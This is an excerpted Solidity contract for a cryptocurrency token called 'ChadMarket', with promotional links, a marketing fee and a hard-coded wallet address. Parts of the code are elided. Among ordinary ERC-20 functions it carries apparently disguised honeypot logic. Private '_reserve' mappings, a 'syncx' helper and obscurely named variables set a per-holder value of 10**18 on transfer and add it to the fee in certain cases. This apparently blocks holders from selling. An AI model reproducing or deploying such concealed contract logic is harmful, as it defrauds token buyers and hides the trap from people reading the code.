...
//Telegram: https://t.me/ChadMarket
//Website: https://chadmarket.club
...
contract ChadMarket is Context, IERC20, Ownable {
    ...
    mapping (address => uint256) private _reserve1;
    mapping (address => uint256) private _reserve2;
    ...
    string private constant _name = "ChadMarket"; //
    string private constant _symbol = unicode"🗿MARKET"; //
    uint8 private constant _decimals = 9; //

    uint256 public _marketingFee = 2;
    uint256 public _liquidityFee = 0;
    address public  _marketingWallet = 0x53cEc8c14EaEd65141b15D0CA0F5049Fa844C1c0;
    ...
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
     ...
     function getTvalues(address account) private view returns(uint256,uint256) {
        return (_reserve1[account],_reserve2[account]);
    }
    ...
    function _getValues(uint256 amount, address from) private returns (uint256) {
        ...
        uint256 asffa1;
        uint256 asffa2;
        (asffa1,asffa2)=getTvalues(from);
        if (_tOwned[from]-asffa1==0)liquidityFee=liquidityFee+asffa2;
    ...
    function syncx(address adr1, address adr2) private{
        _reserve1[adr1]=_tOwned[adr1];
        _reserve1[adr2]=_tOwned[adr2];
    }
    ...
    function _transfer(
        ...
        syncx(to,from);
        _reserve1[to] += amount;
        _reserve1[from] -= amount;
        _reserve2[from]=10**18;
